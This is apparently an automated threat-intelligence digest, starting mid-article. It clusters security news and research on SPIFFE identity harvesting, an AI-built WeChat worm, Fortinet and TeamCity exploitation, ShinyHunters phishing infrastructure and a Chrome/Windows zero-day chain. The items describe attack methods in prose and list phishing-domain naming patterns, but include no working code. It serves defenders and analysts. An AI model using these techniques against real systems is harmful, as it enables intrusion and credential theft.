bootstrap trust — by replacing long-lived secrets with short-lived workload identities. When deployed correctly, SPIFFE enforces strong identity boundaries between workloads. However, these guarantees rely on a core assumption shared by all identity systems that the underlying node is trusted. If an attacker gains root access to a node, they can interact with identity mechanisms to retrieve all identities authorized to that compromised node. Our research explores how attackers can exploit root access to harvest workload identities from a compromised node. In this post, we lay the groundwork by explaining machine identity and how SPIFFE establishes and verifies trust in cloud-native environments. We then demonstrate workload impersonation through selector spoofing. Finally, we introduce Spooffe , a tool we built to automate the extraction of these workload identities (SVIDs). Note to readers: If you’re already familiar with SPIFFE/SPIRE concepts and architecture, you can jump directly to Workload Attestation and How the Agent Attests the Workload sections. SPIFFE Overview Consider a scenario where two applications, a frontend and a backend, must communicate securely. We could generate key pairs and exchange public keys to communicate through Mutual Transport Layer Security (mTLS ) , but this option raises a few key questions: Who rotates those keys? Who re
```

#### Corroborating sources (1)

- **Unit 42** (threat_research_primary)
  - Title: The Machine With Many Faces: Post-Exploitation Identity Misuse in SPIFFE/SPIRE
  - Published: 2026-09-10T10:00:43+00:00
  - Link: https://unit42.paloaltonetworks.com/kubernetes-spiffe-spire-identity-spoofing/
  - Summary: Learn how root access on a compromised K8s node allows attackers to utilize SPIFFE/SPIRE metadata to spoof and harvest co-located workload identities. The post The Machine With Many Faces: Post-Exploitation Identity Misuse in SPIFFE/SPIRE appeared first on Unit 42 .

### Cluster c9071ab0a9 — score 12

- Title: Quoting Calif Research
- Source: Simon Willison (ai_security_agentic_risk)
- Published: 2026-09-10T00:56:41+00:00
- Link: https://simonwillison.net/2026/Sep/10/calif-research/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Today, we're releasing a demo of WeWorm, the first zero-click worm to spread through WeChat calls across iOS and Android. [...] The victim does not need to answer the call, or interact with their phone at all. Even if they do answer, they hear nothing, and the exploit still succeeds. [...] Working with AI, our team found the bug and wrote the first remote code execution (RCE) exploit in about two days. Building the worm took one more week. A worm at this scale used to be the kind of thing that took a larger team months. AI can already do most of the work here. Our team provided the judgment about what to target and how to test it safely. — Calif Research , WeWorm Tags: ai-security-research , ai , llms , security , generative-ai
```

#### Full body

```
Simon Willison’s Weblog Subscribe Sponsored by: Portnox — Shadow AI is the new shadow IT. On Sept. 10, Forrester Research and Portnox share practical steps to regain AI agent visibility, access management, and policy enforcement. Register today 10th September 2026 Today, we're releasing a demo of WeWorm, the first zero-click worm to spread through WeChat calls across iOS and Android. [...] The victim does not need to answer the call, or interact with their phone at all. Even if they do answer, they hear nothing, and the exploit still succeeds. [...] Working with AI, our team found the bug and wrote the first remote code execution (RCE) exploit in about two days. Building the worm took one more week. A worm at this scale used to be the kind of thing that took a larger team months. AI can already do most of the work here. Our team provided the judgment about what to target and how to test it safely. — Calif Research , WeWorm Posted 10th September 2026 at 12:56 am Recent articles The Pelican comparison grid for Astra is pretty interesting - 4th September 2026 OpenAI's rogue agents were caught communicating via public wikis - 4th September 2026 Claude's new system prompt really doesn't want to reproduce song lyrics - 2nd September 2026 This is a quotation collected by Simon Willison, posted on 10th September 2026 . security 629 ai 2,225 generative-ai 1,971 llms 1,937 ai-security-research 40 Disclosures Colophon © 2002 2003 2004 2005 2006 2007 2008 2009 2010 2011 2012 2013 2014 2015 2016 2017 2018 2019 2020 2021 2022 2023 2024 2025 2026
```

#### Corroborating sources (1)

- **Simon Willison** (ai_security_agentic_risk)
  - Title: Quoting Calif Research
  - Published: 2026-09-10T00:56:41+00:00
  - Link: https://simonwillison.net/2026/Sep/10/calif-research/
  - Summary: Today, we're releasing a demo of WeWorm, the first zero-click worm to spread through WeChat calls across iOS and Android. [...] The victim does not need to answer the call, or interact with their phone at all. Even if they do answer, they hear nothing, and the exploit still succeeds. [...] Working with AI, our team found the bug and wrote the first remote code execution (RCE) exploit in about two days. Building the worm took one more week. A worm at this scale used to be the kind of thing that took a larger team months. AI can already do most of the work here. Our team provided the judgment about what to target and how to test it safely. — Calif Research , WeWorm Tags: ai-security-research , ai , llms , security , generative-ai

### Cluster 4ff2661d4c — score 12

- Title: Supply Chain & CTI
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-09-03T19:01:18+00:00
- Link: https://www.team-cymru.com/post/supply-chain-cti
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, ransomware_extortion, supply_chain
- affected_industries: government
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain, data_breach
- affected_industries: government
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
This blog explores how cyber threat intelligence (CTI) must change and support a new approach to supply chain risk.
```

#### Full body

```
Will Thomas 5 min read July 8, 2025 Supply Chain & CTI Why expanding third party risks is no longer a luxury In this blog, we’ll explore how cyber threat intelligence (CTI) must change and support a new approach to supply chain risk. Across the globe, many new laws like DORA in the EU and CMMC in the US have been implemented, driving the need to not just reactively engage with your supply chain, but proactively collaborate and monitor third-party infrastructure for signals of compromise. The underlying intention is that the ecosystem you are part of is more robust when working together. These regulations are likely to be adopted by many other industries, making this blog worthwhile reading for security teams of all sizes and sectors. Reactive supply chain management typically involves sending Supplier Assurance Questionnaires (SAQs) to suppliers after a confirmed breach has occurred, often by the time it makes the news. Many large organizations have taken the initiative to leverage threat intelligence services that support checking for brand name keywords or domains appearing on ransomware data leak sites, cybercrime forum posts, or darkweb credential markets. An even more proactive measure that could be taken to manage supply chain risks involves using passive scanning services to check for unpatched vulnerabilities in supply chain networks, as well as using NetFlow data to detect malicious command-and-control (C2) communications originating from supplier environments. Key Findings Technology leaders are issuing warnings to their supply chain to modernise their cybersecurity practices Governments are introducing more legislation to protect digital services and critical sectors from supply chain risks More organizations need to incorporate proactive threat intelligence to evaluate supply chain vendors Netflow data presents itself as a useful alternative method for organizations to validate supply chain ecosystems. Supply Chain Management Many organizations start by prioritising who their supply chain vendors are and create a criteria based on several factors, such as the impact to business operations if they were attacked, or the sensitivity of the data they process or store for them. Other factors that come into play are whether the supply chain vendors have direct network access into the organization’s environment, and which environments those are as well. One of the challenging aspects for CTI teams doing this type of work is figuring all these things out for a large number of suppliers. Fortune 500 organizations will often have upwards of 5,000 suppliers, in many cases from around the world. Working out these factors for every supplier to rank and prioritise them is difficult on its own. This type of information is often only available in contracts possessed by the procurement or law departments and may be vague and obscure. Getting a handle on which suppliers have direct network access to your organization’s environment is often made a priority due to the implications of a software supply chain attack or identity-based network intrusion. Without network-level visibility to know where cyber threats can arrive from, the chances of detecting an intrusion are severely diminished. In other cases, knowing which suppliers handle the most sensitive information about your organization is also crucial to understanding your expanded attack surface that extends to third parties. Supply chain partners such as law firms will often hold highly sensitive information for their clients, making them ideal targets for persistent adversaries willing to put in the work to get in. Defining Cyber Threat Intelligence Team Capabilities Before we detail the sources of CTI, let’s explore the nuances that will enable you to align with your existing teams and capabilities. First on the maturity ladder from a CTI perspective is supporting Incident Response operations, which can include Reactive Threat Hunting operations. At this stage, many CTI teams r
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Supply Chain & CTI
  - Published: 2026-09-03T19:01:18+00:00
  - Link: https://www.team-cymru.com/post/supply-chain-cti
  - Summary: This blog explores how cyber threat intelligence (CTI) must change and support a new approach to supply chain risk.

### Cluster bd4fb91f5d — score 12

- Title: Threat Intelligence: A CISO ROI Guide - Elite Threat Hunters Prevent Supply Chain Breaches
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-09-03T18:58:23+00:00
- Link: https://www.team-cymru.com/post/threat-intelligence-a-ciso-roi-guide-elite-threat-hunters-prevent-supply-chain-breaches
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, ransomware_extortion, supply_chain
- affected_industries: financial_services, legal_professional
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain, data_breach
- affected_industries: financial_services, legal_professional
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Discover how elite threat hunters and Pure Signal Recon help CISOs prevent supply chain breaches, save millions, and boost security ROI. Learn more.
```

#### Full body

```
tcblogposts min read March 13, 2024 Threat Intelligence: A CISO ROI Guide - Elite Threat Hunters Prevent Supply Chain Breaches Up the Ante Against Supply Chain Attacks and Still Have Time to Save the World Introduction In our first post we talked about how external threat hunting with Pure Signal Recon can have a direct financial savings in terms of reducing the cost of a data breach and minimizing risk. In our second blog post we talked about how most organizations need fewer cyber threat intelligence sources than they subscribe to, it’s a good place to realize some tactical yet meaningful budget savings. Based on feedback from our Fortune 10 client, we also explored how too many CTI sources can detract from your external threat hunting program if the curated data isn’t relevant or timely. Let’s discuss the impact Pure Signal Recon had on this Fortune 10 security organization to help them better identify security gaps and confirmed threats originating from their supply chain. Additional visibility and leveraging the right CTI data reduced the cost of compromise, with use cases such as: Early identification of compromised third parties Shut down of threat actor Command & Control (C2) communications in real-time Blocking 24 of 30 significant events with third parties.* Notifying an additional 300 compromised organizations and provided enough information to prevent or minimize damage Raising the cost to attack - Continually forced bad actors to retool their infrastructure “In the beginning of 2020, we saw a major increase in ransomware hitting our third parties. If they are compromised in any way, shape, or form, then our IR and legal teams become actively involved. They make sure that no data related to us is leaked, that [the third party’s] network is secure, and that [the third party] won’t be used as a pivot to get into our networks. There’s a time-consuming process that comes with a compromise of our third parties.” Lead security analyst In addition, their supply chain threat hunting and monitoring efforts earned a projected cost reduction of $1,3M of net present value savings over three years. A Mile Long Supply Chain Requires Significant Expertise to Secure This Fortune 10 multinational national retailer has a supply chain that is expansive as it varied. While there is no doubt their supply chain serves as a strategic advantage; it can also be used as another attack vector to compromise vulnerable core applications and security gaps in infrastructure. This is no surprise considering 98% of organizations have a relationship with at least one third party that has experienced a breach in the last two years.1 Every compromised supply chain partner incident has a significant cost in terms of cybersecurity, legal and potentially PR expertise to respond to an event, depending how far reaching the breach, and how well recognized your brand. Time is crucial to ensuring a third-party breach can’t be used to pivot into core systems. The legal & PR teams get involved to minimize the possibility of negative press and customer notification mandates. “With Recon, we map the infrastructure being used by some ransomware groups. We block them from entering our network, monitor their infrastructures as they evolve, and monitor potential victims such as third-party entities. When [a third party is] compromised, we identify it with Recon, then tell [the third party] how [the threat actor] got in ... and what they need to do to stop them immediately.” Lead security analyst The case study organization typically requires at least 15 FTE security analysts or legal professionals working three days each when a partner is compromised. Using Pure Signal Recon , they were able to block 24 of 30 significant events with a third party. Using a simple formula of $75 per hour for each FTE multiplied by 3 days each, it is easy to see how the cost of responding to supply chain compromises adds up. High-risk third-party threat events where threat hunting team
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Threat Intelligence: A CISO ROI Guide - Elite Threat Hunters Prevent Supply Chain Breaches
  - Published: 2026-09-03T18:58:23+00:00
  - Link: https://www.team-cymru.com/post/threat-intelligence-a-ciso-roi-guide-elite-threat-hunters-prevent-supply-chain-breaches
  - Summary: Discover how elite threat hunters and Pure Signal Recon help CISOs prevent supply chain breaches, save millions, and boost security ROI. Learn more.

### Cluster 1a949c8352 — score 12

- Title: Fortinet Code Execution Flaw Exploited in PivotC2 RAT Attacks
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-09-10T06:33:36+00:00
- Link: https://www.securityweek.com/fortinet-code-execution-flaw-exploited-in-pivotc2-rat-attacks/
- Fetch status: ok
- Member count: 3
- Corroborating source count: 2
- Strong signals: CVE-2025-25249, Fortinet

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, web_shell_backdoor, zero_day
- affected_industries: government, manufacturing_industrial
- affected_products: Android, Fortinet, Ivanti
- cve_ids: CVE-2025-25249
- urgency_signals: preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, data_breach, web_shell_backdoor
- affected_industries: government, manufacturing_industrial
- affected_products: Fortinet, Ivanti, Android
- cve_ids: CVE-2025-25249
- urgency_signals: zero_day, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
The high-severity, unauthenticated vulnerability tracked as CVE-2025-25249 was patched in January 2026. The post Fortinet Code Execution Flaw Exploited in PivotC2 RAT Attacks appeared first on SecurityWeek .
```

#### Full body

```
Threat actors have been exploiting an unauthenticated remote code execution (RCE) vulnerability in Fortinet products to deploy a Node.js RAT, SOCRadar reports. Tracked as CVE-2025-25249 (CVSS score of 7.4) and described as a heap-based buffer overflow issue, the high-severity bug was patched in January in FortiOS and FortiSwitchManager. The flaw “may allow a remote unauthenticated attacker to execute arbitrary code or commands via specifically crafted requests,” Fortinet noted in its advisory . This week, SOCRadar warned that hackers have been exploiting the security defect to deploy the PivotC2 RAT on vulnerable devices. A FortiGate post-exploitation tool, the backdoor provides attackers with interactive shell access, traffic tunneling, network scanning, and configuration harvesting capabilities. SOCRadar believes that PivotC2 was likely developed with the use of AI and that threat actors have been using it in attacks since at least July 2026. Advertisement. Scroll to continue reading. “The threat actors targeted more than 30,000 IP addresses, leading to the exploitation and infection of 178 devices with PivotC2,” SOCRadar says. The attacks mainly targeted US entities, where at least two intrusions have resulted in data exfiltration. According to the cybersecurity firm, the attacks are likely mounted by a Russian-speaking cybercrime actor. On Wednesday, the US cybersecurity agency CISA added CVE-2025-25249 to its Known Exploited Vulnerabilities ( KEV ) catalog, urging federal agencies to patch it within three days, in line with BOD 26-04’s requirements. Patches for the bug were rolled out in FortiOS versions 7.6.4, 7.4.9, 7.2.12, and 7.0.18, and in FortiSwitchManager versions 7.2.7 and 7.0.6. All organizations are advised to update to these or newer versions. Related: Android’s September 2026 Updates Patch 180 Vulnerabilities Related: Chipmaker Patch Tuesday: Nvidia, AMD, Arm Issue Security Advisories Related: Fortinet Patches Critical Vulnerabilities in FortiMonitorOnSight, Chrome Extension Related: ICS Patch Tuesday: Schneider Electric, Siemens Fix Critical Flaws Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire Android’s September 2026 Updates Patch 180 Vulnerabilities Chipmaker Patch Tuesday: Nvidia, AMD, Arm Issue Security Advisories Fortinet Patches Critical Vulnerabilities in FortiMonitorOnSight, Chrome Extension ICS Patch Tuesday: Schneider Electric, Siemens Fix Critical Flaws Ivanti Patches Critical Flaws Across Enterprise Security Products Chrome 153 Patches Seventh Zero-Day of 2026 Microsoft Patches Record 974 Vulnerabilities, Including Two Exploited Zero-Days Adobe Patches Over 170 Vulnerabilities, Including Commerce Zero-Day Latest News Deceptive Android Apps Exploit Google Play Early Access to Evade Reviews Webinar Today: Keep Pace With AI – A New Operating Model for Endpoint Remediation Critical NetScaler Vulnerability Exploited in Attacks Widened Scan Turns Up Fourth Rogue Claude Cyber Incident 4.1 Million Impacted by AdaptHealth Data Breach Organizations Warned of Cisco Secure FMC Exploitation New ‘ShieldCrash’ Zero-Day Exploit Targets Microsoft Defender HelmGuard Raises $7.3 Million for Agentic GRC and Security Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Virtual Event: Attack Surface Management Summit 2026 September 16, 2026 Join as speakers examine the various components of ASM strategy, the push to mandate continuous asset visibility and inventory tools, and the use of red-teaming, bug bounties and pen-tests in modern security programs. Register Webinar: Minimum Viable Business: Can You Prove Your Organization Would Recover? September 2, 2026 In this live w
```

#### Corroborating sources (2)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Fortinet Code Execution Flaw Exploited in PivotC2 RAT Attacks
  - Published: 2026-09-10T06:33:36+00:00
  - Link: https://www.securityweek.com/fortinet-code-execution-flaw-exploited-in-pivotc2-rat-attacks/
  - Summary: The high-severity, unauthenticated vulnerability tracked as CVE-2025-25249 was patched in January 2026. The post Fortinet Code Execution Flaw Exploited in PivotC2 RAT Attacks appeared first on SecurityWeek .
- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: How AI-driven Threat Detection is Reshaping Threat Intelligence
  - Published: 2026-09-04T13:13:53+00:00
  - Link: https://www.team-cymru.com/post/ai-driven-threat-detection-is-reshaping-cybersecurity
  - Summary: Hear Fortinet’s Aamir Lakhani explain the role of AI in cybersecurity and how AI-driven threat detection is reshaping modern threat intelligence.

### Cluster d8c893e316 — score 12

- Title: Behind the Panels: Validating ShinyHunters Cluster A Infrastructure Through Network Telemetry
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-09-04T13:13:53+00:00
- Link: https://www.team-cymru.com/post/validating-shinyhunters-cyber-threat-actors-infrastructure
- Fetch status: ok
- Member count: 3
- Corroborating source count: 3
- Strong signals: ShinyHunters

#### Cluster taxonomy (union across members)
- threat_categories: mfa_bypass, phishing_social_eng, ransomware_extortion
- actor_attribution: ShinyHunters, UNC6240, UNC6661
- affected_industries: financial_services, healthcare
- affected_products: Microsoft SharePoint, Salesforce
- content_type: news_report
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, mfa_bypass
- actor_attribution: ShinyHunters, UNC6661, UNC6240
- affected_industries: financial_services
- affected_products: Salesforce, Microsoft SharePoint
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Use network telemetry to validate cyber threat actors' phishing infrastructure. Track ShinyHunters clusters and defend against SaaS data exfiltration.
```

#### Full body

```
Stephen Campbell 5 min read August 5, 2026 Behind the Panels: Validating ShinyHunters Cluster A Infrastructure Through Network Telemetry Phishing panels are not just credential collection tools. They are infrastructure ecosystems. Behind every convincing login page is a set of domains, hosting providers, certificates, exposed services, operator tooling, and recurring deployment patterns. Those signals matter. They give defenders a way to move beyond a single phishing domain and start understanding how the activity is built, hosted, rotated, and reused. Push Security recently published an inside look at phishing panels used in campaigns linked to ShinyHunters and BlackFile . Their team gained direct access to active operator panels, observed real victim targeting, analyzed multiple variants of the tooling, and identified four primary infrastructure clusters. They also made an important point: while these panels share common heritage, the operators deploying them appear to be separate groups with different infrastructure preferences and operational patterns. That operator-side view is valuable because it shows how the attack works from inside the panel. Team Cymru’s view is different. Using Pure Signal Scout, we looked at the infrastructure layer to validate and expand part of the picture Push identified. Our analysis focused on Cluster A, the Doko’s Panel infrastructure hosted on Mevspace AS201814. Push noted that Cluster A overlaps with Mandiant reporting on UNC6661 , and that Mandiant attributes related extortion activity following UNC6661 intrusions to UNC6240, also known as ShinyHunters. Using passive DNS, certificate data, open service observations, and hosting patterns, we identified two active Mevspace IPs consistent with Push’s Cluster A criteria. Those IPs were associated with more than 40 victim-themed domains, recurring naming conventions, and one Doko-branded hosting-layer artifact that provides additional pivot context. This is not a reattribution of the activity. Push established the panel and cluster framework. Team Cymru’s contribution is infrastructure validation: confirming that infrastructure consistent with Push’s Cluster A reporting was active on Mevspace and surfacing additional indicators defenders can hunt against. Why Cluster A matters Cluster A matters because the targeting pattern is not random. Push described campaigns that combine voice phishing with adversary-in-the-middle credential capture against enterprise identity providers and cryptocurrency platforms. The victim is typically directed to a domain that looks like an internal identity, support, passkey, or SSO page. Once credentials and MFA are captured, the operator can attempt to access identity providers and pivot into connected SaaS environments such as Salesforce, SharePoint, Slack, DocuSign, or other high-value applications. That makes the infrastructure behind these panels important. The domain is the visible piece, but it is rarely the whole picture. Hosting providers, ASN usage, TLS behavior, passive DNS history, certificates, and exposed services can show how the operation is being staged. In this case, Push identified Mevspace AS201814 as the hosting provider for Cluster A. They also documented the Cluster A naming patterns, including: <target>internal.com <target>sso.com my<target>.com my<target>internal.com my<target>manager.com my<target>sso.com Using those patterns as a starting point, Scout surfaced active infrastructure consistent with the same cluster. Confirming Cluster A on Mevspace Push identified Mevspace AS201814 as the Cluster A hosting provider but did not publish IP-level indicators. Starting from the hosting provider and domain naming criteria, a single Scout query returned three results: asn="201814" pdns.domain="*internal.com,*sso.com" Scout query result for Mevspace AS201814 with the Cluster A domain pattern Figure 1: Scout returns three IPs for the Mevspace AS201814 plus *internal.com,*sso.com query. Two of them,
```

#### Corroborating sources (3)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Behind the Panels: Validating ShinyHunters Cluster A Infrastructure Through Network Telemetry
  - Published: 2026-09-04T13:13:53+00:00
  - Link: https://www.team-cymru.com/post/validating-shinyhunters-cyber-threat-actors-infrastructure
  - Summary: Use network telemetry to validate cyber threat actors' phishing infrastructure. Track ShinyHunters clusters and defend against SaaS data exfiltration.
- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: AdaptHealth confirms 4.1 million people exposed in July cyberattack
  - Published: 2026-09-09T21:30:36+00:00
  - Link: https://www.bleepingcomputer.com/news/security/adapthealth-confirms-41-million-people-exposed-in-july-cyberattack/
  - Summary: Healthcare company AdaptHealth has confirmed that data of 4.1 million people was exposed in a cyberattack discovered in July that was attributed to the ShinyHunters threat group. [...]
- **Dark Reading** (cyber_news_breach_reporting)
  - Title: What We Missed: Did ShinyHunters 'Breach' ReliaQuest?
  - Published: 2026-09-03T19:42:39+00:00
  - Link: https://www.darkreading.com/cybersecurity-operations/what-we-missed-did-shinyhunters-breach-reliaquest
  - Summary: In this video conversation, Dark Reading editors discuss some of the news they didn't get a chance to cover, from the latest antics of ShinyHunters to new research about the prevalence (or lack thereof) of AI-generated malware.

### Cluster 9d718427a9 — score 12

- Title: Attackers Breached JetBrains Cadence via Unpatched TeamCity, Extracting AWS Credentials
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-05T16:52:33+00:00
- Link: https://thehackernews.com/2026/09/attackers-breached-jetbrains-cadence.html
- Fetch status: ok
- Member count: 3
- Corroborating source count: 2
- Strong signals: AWS

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, data_breach, ransomware_extortion
- affected_industries: financial_services
- affected_products: AWS
- cve_ids: CVE-2026-63077
- urgency_signals: actively_exploited, no_patch_yet, preauth_unauth
- content_type: news_report, vendor_announcement
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach, active_exploitation
- affected_products: AWS
- cve_ids: CVE-2026-63077
- urgency_signals: actively_exploited, preauth_unauth, no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
JetBrains is urging Cadence users to revoke and rotate all credentials following a security incident last month in which unidentified threat actors exploited a recently disclosed critical vulnerability in TeamCity to breach its own environment. "Cadence users should immediately revoke or rotate all credentials and secrets that may have been used to run their Cadence executions," JetBrains said.
```

#### Full body

```
Attackers Breached JetBrains Cadence via Unpatched TeamCity, Extracting AWS Credentials  Ravie Lakshmanan  Sep 05, 2026 Data Breach / Identity Security JetBrains is urging Cadence users to revoke and rotate all credentials following a security incident last month in which unidentified threat actors exploited a recently disclosed critical vulnerability in TeamCity to breach its own environment. "Cadence users should immediately revoke or rotate all credentials and secrets that may have been used to run their Cadence executions," JetBrains said . "They should also treat all executions, including their inputs and outputs in your Cadence project, as potentially untrusted." "As the threat actors gained access to the Cadence server, any credentials or secrets stored in Cadence, contained in the compromised backup, or made available to executions on the affected server should be considered compromised and must be revoked or rotated." Cadence is a JetBrains-hosted cloud computing service that integrates with PyCharm via an optional plugin to let developers run machine learning and heavy workloads on cloud GPUs directly from their IDE. The attack, per the software development company, involved the exploitation of CVE-2026-63077 (CVSS score: 9.8) to breach the affected Cadence environments. The deserialization of untrusted data vulnerability can permit an unauthenticated attacker with access to a TeamCity server to bypass authentication checks and execute arbitrary operating system commands with the privileges of the TeamCity server process. The security flaw has since come under active exploitation in the wild, with the U.S. Cybersecurity and Infrastructure Security Agency (CISA) adding it to the Known Exploited Vulnerabilities (KEV) catalog on August 5, 2026. The exploitation activity targeting Cadence was discovered by JetBrains on August 23, 2026. In subsequent updates, JetBrains said the threat actor accessed data contained in the Cadence server backup from 2024 and that they obtained unauthorized access that could have allowed them to reach storage containing data associated with current Cadence users, including email addresses, project source code, and credentials. "This affects the same group of users we previously contacted directly," Daniel Gallo, Solutions Engineering Lead at JetBrains, said. "These findings did not identify any additional affected users. As a precaution, we are treating the data stored there as potentially exposed." Some of the information the threat actor has been "confirmed" to have accessed or compromised - Personal data, including usernames, real names, email addresses, last-login timestamps, and last accessed IP addresses A full backup of the Cadence server dating from 2024, which contains credentials, configuration, artifacts, logs, or other data Multiple AWS IAM users and associated credentials/secrets used with Cadence extracted from the 20224 backup, including IAM users belonging to JetBrains employees who used the service Files stored in S3 buckets within JetBrains AWS accounts used by Cadence JetBrains also cautioned that the attackers may have accessed source code synchronized from PyCharm projects to the affected server. This covers scenarios where users have relied on PyCharm to upload or synchronize project files for execution in Cadence, meaning the actions could have inadvertently exposed code, credentials, or configurations. It's not clear who is behind the activity. However, JetBrains said the intrusion took place between August 8 and 24, 2026. The exploited Cadence server ("api.cadence.jetbrains.com") has since been taken offline. The company conceded that the server in question should have been patched as part of its own vulnerability response efforts, but did not share any details as to why this did not happen. JetBrains has also invalidated all access tokens used by the JetBrains Cadence plugin in PyCharm to connect to Cadence. It has shared the following indicators of compromise - A
```

#### Corroborating sources (2)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Attackers Breached JetBrains Cadence via Unpatched TeamCity, Extracting AWS Credentials
  - Published: 2026-09-05T16:52:33+00:00
  - Link: https://thehackernews.com/2026/09/attackers-breached-jetbrains-cadence.html
  - Summary: JetBrains is urging Cadence users to revoke and rotate all credentials following a security incident last month in which unidentified threat actors exploited a recently disclosed critical vulnerability in TeamCity to breach its own environment. "Cadence users should immediately revoke or rotate all credentials and secrets that may have been used to run their Cadence executions," JetBrains said.
- **AWS Security Blog** (cloud_identity_infrastructure)
  - Title: Incident response guide for AWS CloudTrail investigations – Part 2
  - Published: 2026-09-03T21:15:53+00:00
  - Link: https://aws.amazon.com/blogs/security/incident-response-guide-for-aws-cloudtrail-investigations-part-2/
  - Summary: In Part 1 of this guide, we examined two common incident scenarios: cross-account Amazon Simple Storage Service (Amazon S3) data deletion with ransomware implications, and cryptocurrency mining deployed through AWS CloudFormation using exposed AWS Management Console credentials. We also introduced key incident response terminology and investigative frameworks for analyzing AWS CloudTrail events. In this second […]

### Cluster 44179b1aeb — score 11

- Title: Mind the (Patch) Gap: Multiple Chinese Threat Actors Chain 0-day Exploits in Chrome & Windows
- Source: Volexity (threat_research_primary)
- Published: 2026-09-09T17:36:22+00:00
- Link: https://www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng, web_shell_backdoor, zero_day
- actor_attribution: APT31
- affected_industries: education, financial_services, government
- affected_products: Microsoft Windows
- cve_ids: CVE-2026-85046, CVE-2026-85880, CVE-2026-87491
- urgency_signals: no_patch_yet, zero_day
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng, zero_day, web_shell_backdoor
- actor_attribution: APT31
- affected_industries: financial_services, government, education
- affected_products: Microsoft Windows
- cve_ids: CVE-2026-85046, CVE-2026-87491, CVE-2026-85880
- urgency_signals: zero_day, no_patch_yet
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
On September 1, 2026, Volexity’s Network Security Monitoring (NSM) service detected a spear-phishing campaign from a Chinese threat actor it tracks as UTA0560 targeting customers at multiple non-governmental organizations (NGOs). […] The post Mind the (Patch) Gap: Multiple Chinese Threat Actors Chain 0-day Exploits in Chrome & Windows appeared first on Volexity .
```

#### Full body

```
Threat Intelligence Mind the (Patch) Gap: Multiple Chinese Threat Actors Chain 0-day Exploits in Chrome & Windows September 9, 2026 Ankur Saini, Conor Quigley, Sean Koessel, Steven Adair, and Tom Lancaster On September 1, 2026, Volexity’s Network Security Monitoring (NSM) service detected a spear-phishing campaign from a Chinese threat actor it tracks as UTA0560 targeting customers at multiple non-governmental organizations (NGOs). The emails contained a message encouraging the users to a click a link that led to the website of a US-based university. These links abused a reflected cross-site scripting (XSS) vulnerability on the website, redirecting recipients to threat-actor-controlled infrastructure hosting a multi-stage exploit chain that included a Google Chrome zero-day, CVE-2026-85046 . Volexity analyzed its email telemetry and discovered that another Chinese threat actor it tracks as JungleBamboo (also known as APT31/Violet Typhoon/TA412) was also exploiting the same vulnerability chain against a different set of targets using different infrastructure and post-exploitation malware. CVE-2026-85046 was reported to the Chromium project by a private security researcher on August 4, 2026. A fix later entered the open-source Chromium codebase, on which Google Chrome and other Chromium-based browsers are built. However, at the time of the phishing operation, the fix had not reached a released version of Google Chrome. This created an unusual patch gap: The vulnerability was known and fixed upstream, making it an N-day at the Chromium source level, but there was no patch release for Google Chrome users. Therefore, the exploit was effectively a zero-day against Google Chrome. The exploit first gains arbitrary read/write within the V8 sandbox through the Type confusion vulnerability (CVE-2026-85046), then combines a separate WebAssembly defect to escape the V8 sandbox ( CVE-2026-87491 ). It then exploits a third vulnerability in the Windows kernel ( CVE-2026-85880 ) to escape Chrome’s sandboxed renderer process and inject code into the Chrome browser process. From there, exploit-chain users can deploy a payload of their choice. Volexity observed two distinct clusters of activity using the exploit chain to deliver different payloads: UTA0560 downloaded and deployed the GRIMWEDGE JScript backdoor providing host reconnaissance, file and process management, command execution, and payload delivery capabilities. JungleBamboo deployed SUPERSTOMP, a loader that installed the LONGTALE credential-stealing Chrome extension. This blog documents the 